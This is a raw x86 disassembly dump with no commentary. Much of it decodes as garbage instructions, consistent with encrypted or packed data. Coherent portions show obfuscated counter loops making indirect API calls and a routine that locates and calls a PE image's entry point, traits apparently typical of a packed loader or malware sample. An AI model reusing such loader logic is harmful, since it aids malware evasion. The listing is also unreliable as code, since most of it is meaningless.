  41100f:	xor    edi,DWORD PTR [ecx-0x1a]
  411012:	mov    eax,ds:0x32a59e0c
  411017:	jle    0x410f9a
  411019:	shl    DWORD PTR [edi-0x73],0xcd
  41101d:	dec    DWORD PTR [ebx+0x3f033f1]
  411023:	jne    0x41102d
  411025:	mov    DWORD PTR [ebp+0x8],esi
  411028:	mov    esi,DWORD PTR [ebp+0x8]
  41102b:	xor    esi,ecx
  41102d:	jmp    0x4112e9
  411032:	jo     0x41107c
  411034:	rsqrtps xmm6,XMMWORD PTR [edi]
  411037:	pop    ebp
  411038:	jge    0x4110ae
  41103a:	pop    ecx
  41103b:	mov    ebx,0xc094754
  411040:	xchg   esi,eax
  411041:	mov    eax,0x7e7e4f68
  411046:	popf   
  411047:	js     0x4110c7
  411049:	jle    0x410fd3
  41104b:	xlat   BYTE PTR ds:[ebx]
  41104c:	in     al,0x46
  41104e:	dec    ebx
  41104f:	fldlg2 
  411051:	stc    
  411052:	dec    esi
  411053:	adc    DWORD PTR [esi-0x2f],eax
  411056:	push   ds
  411057:	cmp    esp,DWORD PTR [edx+0xdf49d03]
  41105d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41105e:	jbe    0x4110b3
  411060:	(bad)  
  411061:	into   
  411062:	bound  eax,QWORD PTR cs:[eax+0x78]
  411066:	jno    0x41103e
  411068:	sbb    al,0xd5
  41106a:	mov    dh,0xd7
  41106c:	mov    esp,0xb7dfd70c
  411071:	jne    0x411077
  411073:	bnd jle 0x411073
  411076:	stc    
  411077:	fyl2xp1 
  411079:	in     eax,0x75
  41107b:	sbb    ebx,DWORD PTR [edi-0x18]
  41107e:	hlt    
  41107f:	in     al,0x2e
  411081:	inc    esp
  411082:	nop
  411083:	mov    WORD PTR [eax],ds
  411085:	aas    
  411086:	imul   edi,DWORD PTR [ebx],0xd1259c92
  41108c:	(bad)  
  41108d:	lock gs nop
  411090:	cmc    
  411091:	cdq    
  411092:	inc    edx
  411093:	test   BYTE PTR [ecx+0x24113957],0x9f
  41109a:	mov    eax,0xf9d719d6
  41109f:	mov    cl,0x60
  4110a1:	cli    
  4110a2:	ror    al,0x4
  4110a5:	dec    ebp
  4110a6:	xor    eax,DWORD PTR [bp+si+0x11db]
  4110ab:	es sahf 
  4110ad:	fdiv   DWORD PTR [edi]
  4110af:	bnd call 0x992be20b
  4110b5:	mov    WORD PTR [esp+edx*1],cs
  4110b8:	retf   
  4110b9:	ja     0x41105b
  4110bb:	or     al,0xbf
  4110bd:	repnz pop ebp
  4110bf:	xchg   BYTE PTR [eax-0x4439aaf4],ah
  4110c5:	cld    
  4110c6:	out    0x3c,eax
  4110c8:	out    dx,al
  4110c9:	push   edx
  4110ca:	test   ebx,0x7cdf220c
  4110d0:	mov    dl,0xfe
  4110d2:	std    
  4110d3:	pushf  
  4110d4:	sbb    BYTE PTR [edi],dh
  4110d6:	sbb    eax,eax
  4110d8:	ret    0x3922
  4110db:	je     0x4110b4
  4110dd:	imul   edi,DWORD PTR [esi-0x467f4dac],0xf43794d5
  4110e7:	jg     0x411074
  4110e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110ea:	add    DWORD PTR [esi],esi
  4110ec:	in     eax,0xdb
  4110ee:	(bad)
  4110f1:	fadd   QWORD PTR [ecx-0x77]
  4110f4:	jge    0x411115
  4110f6:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4110f8:	mov    bl,0x8c
  4110fa:	mov    BYTE PTR [eax+0x7c],al
  4110fd:	test   BYTE PTR [eax],0x2b
  411100:	gs adc cl,al
  411103:	sqrtps xmm0,XMMWORD PTR [edx]
  411106:	xchg   edi,eax
  411107:	jle    0x41116e
  411109:	fscale 
  41110b:	scas   al,BYTE PTR es:[edi]
  41110c:	dec    ecx
  41110d:	stc    
  41110e:	les    ecx,FWORD PTR [edx+0x5e]
  411111:	inc    edi
  411112:	fdiv   QWORD PTR [edi]
  411114:	icebp  
  411115:	jns    0x411149
  411117:	and    ecx,edi
  411119:	jp     0x41109e
  41111b:	inc    edi
  41111c:	pop    ss
  41111d:	mov    ecx,0xea239cf3
  411122:	sub    eax,0xbe395650
  411127:	push   esi
  411128:	pushf  
  411129:	(bad)  
  41112a:	and    ch,BYTE PTR [ebx+0x45dd2d02]
  411130:	mov    cl,0x66
  411132:	push   ss
  411133:	inc    ecx
  411134:	leave  
  411135:	adc    BYTE PTR [eax-0xf842999],ah
  41113b:	jb     0x4110fd
  41113d:	les    esi,FWORD PTR [ebx-0x5b]
  411140:	sbb    DWORD PTR [ebx],ecx
  411142:	sub    al,0xd
  411144:	dec    esi
  411145:	inc    esi
  411146:	pusha  
  411147:	bnd ja 0x4110f2
  41114a:	sub    ebp,DWORD PTR [ebx+0x60836ed8]
  411150:	and    DWORD PTR [edi],edi
  411152:	xchg   ebx,eax
  411153:	pushf  
  411154:	lock mov WORD PTR [eax+0x65],?
  411158:	aam    0x1d
  41115a:	mov    ds:0xe9fce7a9,al
  41115f:	cmc    
  411160:	or     al,0x9d
  411162:	or     ebp,DWORD PTR [ebp-0x154d406c]
  411168:	ror    dl,0x96
  41116b:	fs xor eax,0x336b6f77
  411171:	out    dx,al
  411172:	loopne 0x4111b3
  411174:	fistp  WORD PTR [ebp+0x2f]
  411177:	xchg   edx,eax
  411178:	adc    ah,BYTE PTR [esi]
  41117a:	adc    al,0xe6
  41117c:	adc    eax,0xd3c8f805
  411181:	nop
  411182:	mov    dl,0x65
  411184:	in     al,dx
  411185:	adc    eax,0xae428008
  41118a:	pushf  
  41118b:	add    BYTE PTR [ebx-0x20],0x23
  41118f:	lods   eax,DWORD PTR ds:[esi]
  411190:	inc    edi
  411191:	and    bh,0x6d
  411194:	out    0x4a,eax
  411196:	dec    esi
  411197:	adc    BYTE PTR [ebx+ebx*1+0x8b0d810],0x3d
  41119f:	hlt    
  4111a0:	push   ds
  4111a1:	sub    cl,al
  4111a3:	repz gs inc esp
  4111a6:	push   ebx
  4111a7:	mov    BYTE PTR [eax-0x5885191f],0xd
  4111ae:	sub    esi,DWORD PTR [esi+0x6db3dfb7]
  4111b4:	cs pusha 
  4111b6:	arpl   WORD PTR [ebx+0x721bdc70],cx
  4111bc:	dec    ebp
  4111bd:	inc    esp
  4111be:	fs dec esi
  4111c0:	pusha  
  4111c1:	(bad)  
  4111c2:	push   ss
  4111c3:	popa   
  4111c4:	pop    edx
  4111c5:	add    esi,DWORD PTR [edi+0x290d2100]
  4111cb:	test   DWORD PTR [ebp+0x1486ae67],ecx
  4111d1:	cmp    al,0xe0
  4111d3:	jo     0x411182
  4111d5:	aaa    
  4111d6:	rol    BYTE PTR [ebp-0x218028bc],1
  4111dc:	and    al,0xf8
  4111de:	push   ds
  4111df:	sbb    ch,BYTE PTR [edx]
  4111e1:	xchg   ebp,eax
  4111e2:	jecxz  0x4111ba
  4111e4:	sti    
  4111e5:	mov    al,ds:0xe031b8b
  4111ea:	jge    0x41121a
  4111ec:	hlt    
  4111ed:	imul   BYTE PTR [eax+0x30]
  4111f0:	nop
  4111f1:	outs   dx,DWORD PTR ds:[esi]
  4111f2:	(bad)  
  4111f3:	jge    0x411204
  4111f5:	dec    edi
  4111f6:	fwait
  4111f7:	add    dh,BYTE PTR [ebp-0x76972b69]
  4111fd:	ins    DWORD PTR es:[edi],dx
  4111fe:	mov    bl,0x8a
  411200:	adc    edi,ebx
  411202:	ror    BYTE PTR [esi],1
  411204:	mov    ds:0x5131623,eax
  411209:	jae    0x41123a
  41120b:	and    eax,0x156044df
  411210:	sub    eax,ebx
  411212:	xor    ecx,DWORD PTR [edi-0x3ee61a90]
  411218:	ret    
  411219:	ficomp DWORD PTR [edx-0x7c]
  41121c:	mov    dh,0xc4
  41121e:	aaa    
  41121f:	lods   eax,DWORD PTR ds:[esi]
  411220:	js     0x411254
  411222:	or     eax,0x1f0fc0ef
  411227:	and    eax,0x88e9a6f2
  41122c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41122d:	das    
  41122e:	xor    al,0xfc
  411230:	push   0xfffffff0
  411232:	arpl   WORD PTR [ebx+0x44],sp
  411235:	ins    BYTE PTR es:[edi],dx
  411236:	popa   
  411237:	cld    
  411238:	fwait
  411239:	mov    dh,0x39
  41123b:	mov    ds,WORD PTR [esi-0x160dc758]
  411241:	xchg   edx,eax
  411242:	fwait
  411243:	les    esp,FWORD PTR [ebx+0x49]
  411246:	cld    
  411247:	sub    DWORD PTR [eax-0x21],esp
  41124a:	xor    eax,0x8585d11d
  41124f:	ds and eax,0x6800ffe1
  411255:	sub    BYTE PTR [edx+0x32f9d67e],cl
  41125b:	ds push esi
  41125d:	sub    al,0xfb
  41125f:	push   ebx
  411260:	add    BYTE PTR [ecx],bh
  411262:	enter  0x433b,0x9c
  411266:	ret    0xbcf5
  411269:	dec    eax
  41126a:	adc    al,0x55
  41126c:	push   edi
  41126d:	call   0xcdc46489
  411272:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411273:	sub    eax,0x89a82451
  411278:	out    0xa6,eax
  41127a:	pop    ecx
  41127b:	inc    ebp
  41127c:	jl     0x4112b4
  41127e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41127f:	cmp    eax,0x66e189f4
  411284:	mov    ebp,DWORD PTR [ebx]
  411286:	pop    ds
  411287:	sar    edi,0x93
  41128a:	out    0xc8,eax
  41128c:	jns    0x4112e9
  41128e:	jb     0x4112eb
  411290:	jns    0x4112f5
  411292:	ds push edx
  411294:	inc    eax
  411295:	leave  
  411296:	arpl   WORD PTR [ecx+eiz*1+0x16],si
  41129a:	inc    ebx
  41129b:	pop    ebx
  41129c:	dec    esi
  41129d:	repnz and BYTE PTR [ecx-0xf7ac713],bh
  4112a4:	scas   eax,DWORD PTR es:[edi]
  4112a5:	mov    cl,0xa5
  4112a7:	push   ebx
  4112a8:	es pop ds
  4112aa:	je     0x411231
  4112ac:	dec    eax
  4112ad:	loopne 0x41126b
  4112af:	loopne 0x411269
  4112b1:	adc    eax,0xfbe73e30
  4112b6:	sbb    ah,cl
  4112b8:	cmp    eax,0x6b714d13
  4112bd:	mov    al,ds:0xcc15962b
  4112c2:	sbb    eax,0xec0a5787
  4112c7:	popf   
  4112c8:	jl     0x411297
  4112ca:	or     al,0x1
  4112cc:	xchg   edi,eax
  4112cd:	inc    edx
  4112ce:	outs   dx,BYTE PTR ds:[esi]
  4112cf:	bound  edi,QWORD PTR [ecx-0x64fc1a2b]
  4112d5:	pop    ebx
  4112d6:	mov    ebp,0xca0d5f88
  4112db:	xchg   ebx,eax
  4112dc:	pop    es
  4112dd:	xor    dh,ch
  4112df:	sub    ah,BYTE PTR [edi-0x1e]
  4112e2:	inc    ecx
  4112e3:	xor    DWORD PTR [ecx-0x50],edx
  4112e6:	enter  0x2d2f,0x33
  4112ea:	lock mov eax,DWORD PTR [edx+0x194]
  4112f1:	mov    ecx,DWORD PTR [eax]
  4112f3:	mov    eax,DWORD PTR [ecx+0x3c]
  4112f6:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434783
  411346:	xor    DWORD PTR ds:0x43474f,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x43467f,0x14
  41135d:	cmp    DWORD PTR ds:0x43467f,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x43467f,0x3
  411371:	jne    0x411387
  411377:	push   0x4348fa
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x43467f,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x43467f
  411399:	dec    eax
  41139a:	mov    ds:0x43467f,eax
  41139f:	mov    eax,ds:0x43467f
  4113a4:	dec    eax
  4113a5:	mov    ds:0x43467f,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x43466f,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x4346c3,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x4346c3
  4113d0:	inc    eax
  4113d1:	mov    ds:0x4346c3,eax
  4113d6:	cmp    DWORD PTR ds:0x4346c3,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x4346c3,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x4346ff
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x4346c3,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x4346c3
  411418:	inc    eax
  411419:	mov    ds:0x4346c3,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43478f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43478f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43478f,ebx
  411442:	cmp    DWORD PTR ds:0x43478f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434713
  411457:	push   0x43485b
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43478f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43478f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43478f,ebx
  41147c:	cmp    DWORD PTR ds:0x43478f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x43465f
  411490:	adc    DWORD PTR ds:0x434747,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434703,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434783,0x434667
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x434753,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x434777,0x434673
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x43474b,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x43467f,0x4346bf
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434793,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x43467f,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x43467f
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x43467f,edi
  411509:	cmp    DWORD PTR ds:0x43467f,0xb
  411510:	jne    0x411529
  411516:	push   0x434787
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x43467f,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x43467f
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x43467f,edi
  411545:	cmp    DWORD PTR ds:0x43467f,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x434667,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x434677,0x1a
  411569:	cmp    DWORD PTR ds:0x434677,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x434677,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x434677,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x434677
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x434677,edi
  4115ac:	mov    edi,DWORD PTR ds:0x434677
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x434677,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x43466b
  4115c4:	adc    DWORD PTR ds:0x434663,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43478b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43478b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43478b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43478b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43478b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43478b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43478b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43478b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x411659
  411641:	test   eax,0x4a8f65be
  411646:	jle    0x4116c6
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x4116c3
  41164d:	dec    edi
  41164e:	mov    fs,WORD PTR [ebp+0x73]
  411651:	inc    edx
  411652:	mov    ebx,0xcf493444
  411657:	jno    0x411635
  411659:	xchg   esp,eax
  41165a:	fild   QWORD PTR [ecx-0x22]
  41165d:	adc    al,0xd5
  41165f:	adc    BYTE PTR [ecx-0x3fa631ba],bl
  411665:	ret    0x3355
  411668:	call   0x98ab9d42
  41166d:	in     eax,dx
  41166e:	clc    
  41166f:	dec    ebx
  411670:	shl    DWORD PTR [ebp+0x3],0xe9
  411674:	xor    edx,DWORD PTR [edx+ebp*1-0x1986d95]
  41167b:	repnz ds pop ecx
  41167e:	pop    es
  41167f:	dec    esp
  411680:	pusha  
  411681:	mov    ds:0x47cb72ca,eax
  411686:	xchg   DWORD PTR [esp+eiz*8-0x737ec653],edi
  41168d:	cmp    ah,BYTE PTR [edi+0x66]
  411690:	dec    esp
  411691:	and    DWORD PTR [ebp-0x39e2ecdf],ebx
  411697:	test   al,0x5c
  411699:	mov    al,0x2d
  41169b:	lahf   
  41169c:	(bad)  
  41169d:	jp     0x41168a
  41169f:	mov    DWORD PTR [ecx],eax
  4116a1:	fnstenv [esi-0x39]
  4116a4:	mov    cl,0x46
  4116a6:	mov    ebx,0x406205c
  4116ab:	mov    ecx,0x4190a20a
  4116b0:	out    0xbb,eax
  4116b2:	outs   dx,BYTE PTR ds:[esi]
  4116b3:	lahf   
  4116b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116b5:	mov    WORD PTR [esi],gs
  4116b7:	(bad)  
  4116b9:	jl     0x411652
  4116bb:	sub    DWORD PTR ds:0xbb0fa0e0,0xa396f572
  4116c5:	sub    cl,BYTE PTR [ecx+0x7c00d84d]
  4116cb:	pop    esp
  4116cc:	or     dh,BYTE PTR [ebx-0x1bea9a57]
  4116d2:	cli    
  4116d3:	scas   eax,DWORD PTR es:[edi]
  4116d4:	mov    ds:0x2bb7dcb7,eax
  4116d9:	mov    ds:0xe90535d2,eax
  4116de:	ss lahf 
  4116e0:	mov    bl,0x4
  4116e2:	sub    eax,0x622aca3a
  4116e7:	gs pop esi
  4116e9:	cld    
  4116ea:	popf   
  4116eb:	or     ebp,DWORD PTR [ebp+0x2ed6c0fd]
  4116f1:	push   ss
  4116f2:	retf   
  4116f3:	xchg   DWORD PTR [ecx-0x14],eax
  4116f6:	dec    edx
  4116f7:	dec    esp
  4116f8:	repnz add dl,BYTE PTR [ebx]
  4116fb:	aam    0x45
  4116fd:	pushf  
  4116fe:	bound  edx,QWORD PTR [ebx-0x45]
  411701:	or     eax,0x5a50f55b
  411706:	adc    eax,0x2a258a72
  41170b:	lds    esp,FWORD PTR [eax+0x69]
  41170e:	ins    DWORD PTR es:[edi],dx
  41170f:	pushf  
  411710:	cmp    al,0xb
  411712:	sub    eax,0x2cf2e146
  411717:	rcl    DWORD PTR [edi-0x5],0x96
  41171b:	or     bl,bh
  41171d:	shr    ch,cl
  41171f:	shl    DWORD PTR [ecx-0x66],0x62
  411723:	ins    DWORD PTR es:[edi],dx
  411724:	jmp    0x41174e
  411726:	xchg   esi,eax
  411727:	sbb    eax,0x7b9344b1
  41172c:	das    
  41172d:	mul    DWORD PTR [ebx]
  41172f:	or     BYTE PTR ds:[eax-0x51232cec],dl
  411736:	jo     0x4117a7
  411738:	fst    DWORD PTR [ebx+ebx*8+0x5b84da50]
  41173f:	(bad)  
  411740:	retf   
  411741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411742:	pop    edx
  411743:	jge    0x4116dc
  411745:	sbb    BYTE PTR [esi+0x7cc2b933],ch
  41174b:	(bad)  
  41174c:	pop    esi
  41174d:	ffreep st(6)
  41174f:	leave  
  411750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411751:	jno    0x4117c1
  411753:	test   eax,0x5331f302
  411758:	or     DWORD PTR [eax+0x260c5c],edi
  41175e:	add    dl,ch
  411760:	sahf   
  411761:	xor    esp,DWORD PTR [eax-0x39]
  411764:	xchg   ecx,eax
  411765:	fimul  DWORD PTR [ebx+0x64d6b047]
  41176b:	jp     0x41179b
  41176d:	mov    bh,0x1d
  41176f:	mov    cs,WORD PTR [edi+0x69]
  411772:	pop    edx
  411773:	add    BYTE PTR [ebp+0x78],bl
  411776:	adc    edi,DWORD PTR [edx-0x5f536fd9]
  41177c:	jmp    0x6c46e13
  411781:	inc    esp
  411782:	mov    BYTE PTR [ecx],al
  411784:	into   
  411785:	aaa    
  411786:	out    dx,eax
  411787:	(bad)  
  411788:	jne    0x411787
  41178a:	outs   dx,DWORD PTR ds:[esi]
  41178b:	xchg   esi,eax
  41178c:	ja     0x411772
  41178e:	sub    al,0x5a
  411790:	mov    edx,0x87ab4fe
  411795:	or     al,0x3
  411797:	iret   
  411798:	xor    DWORD PTR [edi-0x67a11e0b],edi
  41179e:	or     ah,BYTE PTR [ecx+0x137f685c]
  4117a4:	ins    BYTE PTR es:[edi],dx
  4117a5:	mov    ds:0xec35b086,eax
  4117aa:	aas    
  4117ab:	cmp    al,al
  4117ad:	jmp    0x411827
  4117af:	jmp    0x9fc8:0x77e740ed
  4117b6:	xchg   esp,eax
  4117b7:	test   BYTE PTR [edi],bh
  4117b9:	xchg   esp,eax
  4117ba:	dec    ebp
  4117bb:	outs   dx,DWORD PTR ds:[esi]
  4117bd:	mov    ds:0x3f43f11a,al
  4117c2:	aaa    
  4117c3:	cld    
  4117c4:	or     DWORD PTR [edi+0x41],ebx
  4117c7:	xor    dl,BYTE PTR [eax-0x52e651a6]
  4117cd:	call   0xc29b:0x754bafc1
  4117d4:	adc    eax,DWORD PTR [ecx-0x4f43d0bf]
  4117da:	add    al,0xec
  4117dc:	cli    
  4117dd:	inc    edi
  4117de:	rol    ch,1
  4117e0:	stc    
  4117e1:	xchg   esp,eax
  4117e2:	nop
  4117e3:	icebp  
  4117e4:	mov    ds:0x6294cf75,eax
  4117e9:	and    dh,cl
  4117eb:	js     0x4117a8
  4117ed:	inc    esi
  4117ee:	lds    ebp,FWORD PTR [edi]
  4117f0:	or     DWORD PTR [edx],ebp
  4117f2:	mov    ebx,0xb80087c
  4117f7:	scas   eax,DWORD PTR es:[edi]
  4117f8:	(bad)  
  4117fa:	pop    esp
  4117fb:	cld    
  4117fc:	es std 
  4117fe:	push   0xffffffea
  411800:	push   ebp
  411801:	shr    cl,0x6
  411804:	in     al,0x72
  411806:	xor    al,0xc4
  411808:	jne    0x411842
  41180a:	add    eax,esp
  41180c:	inc    esp
  41180d:	outs   dx,BYTE PTR ds:[esi]
  41180e:	call   0x3cfd10a
  411813:	dec    edi
  411814:	aad    0xdc
  411816:	pop    edx
  411817:	inc    edx
  411818:	xor    BYTE PTR [ebx+ebp*2+0x7a],bh
  41181c:	pop    ebp
  41181d:	aad    0x28
  41181f:	pop    ebp
  411820:	or     al,0x9d
  411822:	pop    esp
  411823:	dec    edi
  411824:	mov    DWORD PTR [esi+0x628fa7d6],ecx
  41182a:	arpl   WORD PTR ds:0xbed6e31a,di
  411830:	jns    0x4118aa
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	test   eax,0xea011025
  411855:	push   esp
  411856:	jle    0x4118d6
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x4117ec
  41185d:	retf   
  41185e:	pop    esp
  41185f:	shl    BYTE PTR [eax+0x55],1
  411862:	xor    ebx,ecx
  411864:	inc    edi
  411865:	seta   BYTE PTR [eax+0x523e09e7]
  41186c:	inc    esp
  41186d:	fidiv  WORD PTR [ecx-0x546ad09b]
  411873:	mov    ebp,0xa0d80a17
  411878:	dec    esi
  411879:	inc    eax
  41187a:	and    eax,0x75a29485
  41187f:	or     esi,edi
  411881:	lock test DWORD PTR [edx],ecx
  411884:	adc    cl,BYTE PTR [esi+ecx*2]
  411887:	sbb    al,0x13
  411889:	push   esp
  41188a:	in     eax,0x92
  41188c:	dec    ecx
  41188d:	add    BYTE PTR [ebp+0x7d],ch
  411890:	(bad)  
  411891:	jmp    0x39a82b8e
  411896:	pop    edx
  411897:	inc    edx
  411898:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411899:	jo     0x41185c
  41189b:	mov    bl,BYTE PTR ss:[eax+0x4f]
  41189f:	cmp    ch,BYTE PTR [eax+0x13]
  4118a2:	and    bl,BYTE PTR [edi+ebx*4]
  4118a5:	ficomp WORD PTR [edi]
  4118a7:	push   cs
  4118a8:	or     eax,0xb488e1d4
  4118ad:	stos   DWORD PTR es:[edi],eax
  4118ae:	inc    esp
  4118af:	adc    al,0x5c
  4118b1:	and    edx,DWORD PTR [ebx-0x25889e94]
  4118b7:	test   BYTE PTR [esi+esi*2-0x4d],cl
  4118bb:	mov    dl,0x3e
  4118bd:	adc    al,0x4d
  4118bf:	idiv   BYTE PTR [ebx+0x37]
  4118c2:	out    0x1e,al
  4118c4:	and    BYTE PTR [ebx],ah
  4118c6:	jl     0x4118a3
  4118c8:	inc    ecx
  4118c9:	mov    edx,0x584ae998
  4118ce:	mov    dh,0x10
  4118d0:	sahf   
  4118d1:	jns    0x4118f2
  4118d3:	je     0x41193a
  4118d5:	sbb    esi,DWORD PTR [ebx]
  4118d7:	outs   dx,DWORD PTR ds:[esi]
  4118d8:	adc    DWORD PTR [eax],ebx
  4118da:	xor    al,BYTE PTR [edi+ebp*8+0x11576403]
  4118e1:	adc    eax,ebp
  4118e3:	pop    ecx
  4118e4:	cmp    dl,BYTE PTR [edi+0x69]
  4118e7:	fidivr WORD PTR [edi-0x2d7c7348]
  4118ed:	xor    al,0xfd
  4118ef:	or     eax,0xe3020739
  4118f4:	(bad)  
  4118f6:	adc    ch,BYTE PTR [eax-0x6b]
  4118f9:	ror    DWORD PTR [eax-0x5f],1
  4118fc:	rol    BYTE PTR [eax],0xa2
  4118ff:	in     eax,0x43
  411901:	lahf   
  411902:	pop    ecx
  411903:	xor    ecx,DWORD PTR [ebp+0x14f13ee8]
  411909:	pop    ecx
  41190a:	out    dx,al
  41190b:	xor    DWORD PTR [esi+edi*1-0x43],edi
  41190f:	imul   edx,edx,0xffffff82
  411912:	mov    edx,0x74dddc45
  411917:	pusha  
  411918:	out    dx,eax
  411919:	and    dh,BYTE PTR [edi-0x78]
  41191c:	es out dx,eax
  41191e:	call   0x73c450c0
  411923:	fist   WORD PTR [esi+ebx*2]
  411926:	ja     0x4118df
  411928:	pop    ebx
  411929:	pushf  
  41192a:	gs push ecx
  41192c:	inc    eax
  41192d:	lods   eax,DWORD PTR ds:[esi]
  41192e:	aas    
  41192f:	adc    eax,0xa7d5d100
  411934:	(bad)  
  411935:	adc    DWORD PTR [ecx],ebp
  411937:	lods   al,BYTE PTR ds:[esi]
  411938:	cdq    
  411939:	inc    eax
  41193a:	shr    BYTE PTR [edi],0x3a
